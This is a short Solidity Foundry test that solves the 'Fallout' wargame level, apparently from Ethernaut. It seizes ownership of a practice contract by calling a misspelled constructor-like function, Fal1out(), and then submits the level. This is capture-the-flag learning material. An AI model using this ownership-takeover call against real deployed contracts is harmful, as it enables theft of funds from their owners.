// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IFallout {
  function Fal1out() external payable;
}

contract FalloutTest is Test {
  address internal challengeAddress;
  IFallout internal challenge;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5);
    challenge = IFallout(challengeAddress);
  }

  function testExploit() public {
    // meh... mispelled function
    challenge.Fal1out();

    utils.submitLevelInstance(challengeAddress);
  }
}
